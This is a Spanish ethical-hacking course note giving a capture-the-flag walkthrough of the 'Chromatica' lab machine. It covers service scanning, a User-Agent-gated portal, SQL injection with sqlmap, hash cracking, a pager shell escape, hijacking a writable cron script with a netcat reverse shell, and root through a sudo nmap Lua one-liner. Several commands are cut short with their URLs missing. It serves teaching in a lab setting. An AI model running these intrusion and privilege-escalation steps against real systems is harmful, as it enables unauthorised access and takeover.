---
title: "🖥️ Máquina: Chromatica — Hacking Ético"
aliases:
  - Chromatica
  - chromatica
  - Máquina Chromatica
  - VM Chromatica
  - Writeup Chromatica
tags:
  - ifct0109
  - hacking-etico
  - vms
  - avanzadas
  - linux
  - ctf
---

# 🖥️ Máquina: Chromatica

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Avanzadas  
> **Técnicas trabajadas:** Enumeración de servicios · Fuzzing web · User-Agent spoofing · SQL Injection (sqlmap) · Cracking de hashes · Cron Job Hijacking · Escalada de privilegios (sudo/nmap)  
> **Descripción:** En esta práctica enumeraremos servicios, descubriremos un portal web protegido por User-Agent, explotaremos una inyección SQL con sqlmap, crackearemos hashes, aprovecharemos una curiosidad de SSH para obtener una shell, realizaremos movimiento lateral mediante una tarea cron escribible y escalaremos privilegios con nmap via sudo.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.31`
* **`RHOST` (Víctima / Chromatica):** Ej. `10.0.0.32`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Chromatica tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Escaneo completo de puertos TCP:

```bash
nmap -sT -p- 10.0.0.32
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5353/tcp open  mdns
```

Escaneo detallado sobre los puertos encontrados:

```bash
nmap -v -A -p 22,80,5353 10.0.0.32
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Chromatica|Coming Soon.....
5353/tcp open  domain  dnsmasq 2.86
| dns-nsid:
|_  bind.version: dnsmasq-2.86
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!info] Resultado
> En el puerto 5353 corre dnsmasq 2.86, un servidor DNS/DHCP ligero. Comprobamos si tiene exploits conocidos:

```bash
searchsploit dnsmasq
```

```text
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Dnsmasq < 2.50 - Heap Overflow / Null Pointer Dereferenc | windows/dos/9617.txt
Dnsmasq < 2.78 - 2-byte Heap Overflow                    | multiple/dos/42941.py
Dnsmasq < 2.78 - Heap Overflow                           | multiple/dos/42942.py
Dnsmasq < 2.78 - Information Leak                        | multiple/dos/42944.py
Dnsmasq < 2.78 - Integer Underflow                       | multiple/dos/42946.py
Dnsmasq < 2.78 - Lack of free() Denial of Service        | multiple/dos/42945.py
Dnsmasq < 2.78 - Stack Overflow                          | multiple/dos/42943.py
dnsmasq-utils 2.79-1 - 'dhcp_release' Denial of Service  | linux/dos/48301.py
Web Interface for DNSmasq / Mikrotik - SQL Injection     | php/webapps/39817.php
--------------------------------------------------------- ---------------------------------
```

> [!info] Resultado
> Los exploits disponibles afectan a versiones anteriores a 2.78 o a 2.79, pero la versión instalada es 2.86, por lo que ninguno es aplicable. Continuamos enumerando por la web.

---

## 🌐 Fase 2: Enumeración web y fuzzing

Lanzamos gobuster para descubrir rutas y archivos en el servidor web:

```bash
gobuster dir -r -u
```

> [!info] Resultado
> Solo encontramos algo interesante: el archivo robots.txt. Lo consultamos:

```bash
curl
```

```text
user-agent: dev
Allow: /dev-portal/
```

> [!info] Resultado
> El robots.txt revela que existe una ruta /dev-portal/ y que solo está permitida para el User-Agent dev. Intentamos acceder sin modificarlo:

```bash
curl
```

```text
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```

> [!info] Resultado
> El servidor devuelve un 403 Forbidden. La aplicación comprueba el User-Agent para decidir si mostrar el contenido. Enviamos la petición con el User-Agent correcto mediante la opción -H de curl. Fíjate en la barra final de la URL: es importante incluirla para evitar una redirección 302 que haría fallar la petición:

```bash
curl
```

```text
<!DOCTYPE html>
<html>
<head>
  <title>Chromatica</title>
</head>
<body>
  <div class="container">
    <h1>Search</h1>
    <form action="search.php" method="get">
      <label for="query">Chromatica</label>
      <input type="text" id="query" name="city" placeholder="Type a city's name...">
      <button type="submit">Go</button>
    </form>
  </div>
</body>
</html>
```

> [!info] Resultado
> Con el User-Agent correcto el servidor nos muestra el portal. Contiene un formulario de búsqueda que acepta el nombre de una ciudad como parámetro city y lo consulta contra una base de datos. Esto es un candidato claro a SQL injection.

Podemos guardar la web para verla cómodamente en el navegador:

```bash
curl
```

Abrimos Firefox con CTRL+O y navegamos hasta el archivo chromatica.html guardado.

> [!tip] Método Alternativo
> 🔵 Alternativa — ver la web original en Firefox:
> Para acceder directamente con el navegador podemos instalar una extensión que permita cambiar el User-Agent:
> https://addons.mozilla.org/es-ES/firefox/addon/uaswitcher/
> Una vez instalada, pulsamos en su icono → Preferencias → añadimos el User-Agent dev en la parte inferior. Después abrimos una nueva pestaña, activamos el User-Agent en la extensión y accedemos a .

---

## 💉 Fase 3: SQL Injection con sqlmap

Usamos sqlmap sobre el parámetro city del formulario. El asterisco al final del valor indica a sqlmap el punto de inyección exacto. La opción -H 'User-Agent: dev' es necesaria para que el servidor nos deje pasar. Con --dbs --tables pedimos que enumere bases de datos y tablas. Pulsamos ENTER en todas las preguntas que haga sqlmap:

```bash
sqlmap -u
```

```text
Database: Chromatica
[2 tables]
+---------------------------------------+
| cities                                |
| users                                 |
+---------------------------------------+
```

> [!info] Resultado
> El parámetro es vulnerable a SQL injection. Encontramos la base de datos Chromatica con dos tablas: cities y users. Volcamos el contenido de la tabla de usuarios:

```bash
sqlmap -u
```

```text
+----+-----------------------------------------------+-----------+-----------------------------+
| id | password                                      | username  | description                 |
+----+-----------------------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3              | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7              | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9              | intern    | intern                      |
+----+-----------------------------------------------+-----------+-----------------------------+
```

> [!info] Resultado
> Tenemos cinco usuarios con sus hashes de contraseña. Sqlmap ha conseguido crackear uno solo: user:keeptrying. Para obtener el resto usaremos una herramienta online de cracking de hashes.

---

## 🔓 Fase 4: Cracking de hashes

Accedemos a https://crackstation.net/ — recuerda volver a poner el User-Agent a Default en la extensión si lo cambiaste antes — y pegamos los cinco hashes:

```text
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9
```

> [!info] Resultado
> CrackStation resuelve cuatro de los cinco hashes. Las credenciales obtenidas son:
> · admin:adm!n
> · dev:flaghere
> · user:keeptrying
> · intern:intern00
> La contraseña de dev es flaghere, lo que invita a probarla. Intentamos acceder por SSH con ese usuario.

---

## 🔑 Fase 5: Acceso SSH — obtención de la primera flag

```bash
ssh dev@10.0.0.32
```

```text
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS
brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 10.0.0.32 closed.
```

> [!info] Resultado
> La cuenta muestra un mensaje y la primera flag, pero cierra la conexión inmediatamente. Sin embargo, hay una forma de esquivar esto aprovechando el comportamiento del paginador cuando el mensaje es demasiado largo para el terminal.

> [!warning] Advertencia
> ⚠️ Truco del terminal: Ampliamos mucho el tamaño de la fuente del terminal con CTRL + rueda del ratón hacia arriba hasta que el terminal sea muy pequeño. También es conveniente reducir el tamaño de la ventana. Luego entramos de nuevo por SSH con la contraseña flaghere.
> Si todo va bien, el mensaje es demasiado largo para caber en pantalla y aparece el paginador mostrando --More--(X%).
> En ese punto escribimos: !/bin/bash
> Esto ejecuta un bash desde dentro del paginador. Ya podemos restaurar el tamaño de la fuente.

```bash
cat user.txt
```

```text
brightctf{ALM0ST_TH3R3_34897ffdf69}
```

```bash
id
```

```text
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

> [!info] Resultado
> Flag de usuario obtenida: brightctf{ALM0ST_TH3R3_34897ffdf69}

---

## ↔️ Fase 6: Movimiento lateral — Cron Job Hijacking

Buscamos archivos con permisos de escritura para todos los usuarios, excluyendo directorios de sistema que generarían mucho ruido:

```bash
find / -type f -perm -006 2>/dev/null | egrep -v "var|sys|proc"
```

```text
/opt/scripts/end_of_day.sh
```

> [!info] Resultado
> Encontramos un script en /opt/scripts/ que cualquier usuario puede escribir. Comprobamos sus permisos y propietario:

```bash
ls -la /opt/scripts/end_of_day.sh
```

```text
-rwxrwxrw- 1 analyst analyst 30 Jun 30 18:00 /opt/scripts/end_of_day.sh
```

> [!info] Resultado
> El script pertenece al usuario analyst y tiene permisos de escritura para todos (rw- en el último grupo). Por el nombre parece una tarea que se ejecuta periódicamente. Revisamos el crontab del sistema:

```bash
crontab -l
```

> [!info] Resultado
> El crontab del usuario dev no muestra nada. Revisamos el crontab del sistema:

```bash
cat /etc/crontab
```

```text
* * * * *  analyst /bin/bash /opt/scripts/end_of_day.sh
```

> [!info] Resultado
> El script se ejecuta cada minuto como el usuario analyst. Como tenemos permisos de escritura sobre él, podemos añadirle una reverse shell que nos llegará con la identidad de analyst.

```bash
🔵 Alternativa — verificar la tarea con pspy64s:
    Si queremos confirmar visualmente que la tarea se está ejecutando podemos usar pspy, una herramienta que monitoriza procesos en tiempo real sin necesidad de privilegios de root:
    wget -c https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
```

```bash
chmod +x pspy64s
```

```bash
./pspy64s
```

```text
2025/09/28 11:59:01 CMD: UID=1002 PID=1881  | /bin/sh -c /bin/bash /opt/scripts/end_of_day.sh
```

```bash
cat /etc/passwd | grep analyst
```

```text
analyst:x:1002:1002::/home/analyst:/bin/bash
```

Dividimos el terminal en horizontal. En la parte inferior ponemos Kali en escucha:

```bash
nc -lvnp 9002
```

En la parte superior, desde la shell de dev, añadimos la reverse shell al script:

```bash

```

Verificamos que se ha añadido correctamente:

```bash
cat /opt/scripts/end_of_day.sh
```

> [!info] Resultado
> Esperamos como máximo un minuto a que cron ejecute la tarea. Cuando llegue la conexión mejoramos la shell con Python:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

```bash
id
```

```text
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

> [!info] Resultado
> Tenemos una shell como analyst. Ahora escalamos a root.

---

## 🚀 Fase 7: Escalada de privilegios — sudo/nmap

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/nmap
```

> [!info] Resultado
> analyst puede ejecutar nmap como root sin contraseña. Nmap tiene soporte para scripts en Lua a través de su motor NSE. Podemos crear un script que ejecute una shell y pasárselo a nmap con --script. Consultamos la técnica exacta en GTFOBins — nmap (sudo):

```bash
TF=$(mktemp); echo 'os.execute("/bin/bash")' > $TF; sudo nmap --script=$TF
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd /root
```

```bash
cat root.txt
```

```text
brightctf{DIR_EN_GREY_59ce1d6c207}
```

> [!info] Resultado
> Flag de root obtenida: brightctf{DIR_EN_GREY_59ce1d6c207}

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
